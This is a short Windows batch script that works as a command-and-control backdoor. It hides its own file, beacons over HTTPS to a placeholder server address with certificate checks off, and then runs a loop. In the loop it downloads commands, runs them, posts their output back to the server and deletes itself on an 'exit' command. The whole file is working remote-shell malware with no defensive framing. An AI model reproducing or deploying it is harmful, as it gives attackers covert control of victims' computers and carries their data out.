@echo off

SET /A INDEX=1
SET /A COUNT=5
SET preq="0"

attrib +h +s %0

:BEACON
IF %INDEX% LEQ %COUNT% (
	curl https://{IP}:443/ -k | findstr "OK" > NUL && (GOTO:SHELL)
	echo "Timed out..."
	timeout /t 2 /nobreak > NUL
	timeout /t 120 /nobreak > NUL
	SET /A "INDEX=%INDEX%+1"
	GOTO:BEACON 
) ELSE (
	taskkill /F /IM cmd.exe
)

:SHELL
FOR /F "delims=" %%i IN ('curl -X GET https://{IP}:443/ -tlsv1 -k') DO set command2=%%i
echo %command2% | FINDSTR "exit" > NUL && (
	echo > %0
	EXIT
)
CALL %command2% > %TEMP%\out
curl -X POST --data-binary @%TEMP%\out https://{IP}:443/ -k -tlsv1
echo > %TEMP%\out
timeout /t 10 /nobreak >NUL
GOTO:SHELL
